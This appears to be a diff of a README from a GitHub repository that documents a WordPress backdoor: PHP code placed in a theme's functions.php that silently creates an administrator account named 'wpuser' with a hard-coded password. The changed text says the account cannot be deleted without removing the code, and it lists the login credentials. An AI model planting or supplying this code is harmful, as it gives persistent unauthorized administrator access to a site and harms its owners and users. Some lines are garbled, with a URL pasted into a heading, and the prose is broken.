@@ -106,20 +106,20 @@ $new_user->set_role('administrator');
 
 ```bash
 
- $username = 'wpuser';
+                  $username = 'wpuser';
                   $password = '1234567890@';
     
                   $email_address = 'wordpress@example.com';
 
-                  if (! username_exists($username ) ) { $user_id = wp_create_user( $username, $password, $email_address ); 
-                  $user = new WP_User( $user_id); $user->set_role( 'administrator' );
+          if (! username_exists($username ) ) { $user_id = wp_create_user( $username, $password, $email_address ); 
+                $user = new WP_User( $user_id); $user->set_role( 'administrator' );
                   }
 
 ```
 ![Logo](https://github.com/cyber-insect99/photo-gallery-/blob/main/backdoor%205%20on%20wp%20site.png?raw=true)
-### Thttps://github.com/cyber-insect99/photo-gallery-/blob/main/backdoor%205%20on%20wp%20site.png?raw=truehen go to 'users' option on wordpress deshboard the you will see  a new user .
-- User: user
- - Password: password
+### It will add new user that can't be delete .Only have one way to delete that is delete this code formthis funtion.php file.
+- User: wpuser
+ - Password: 1234567890@
 
 
 
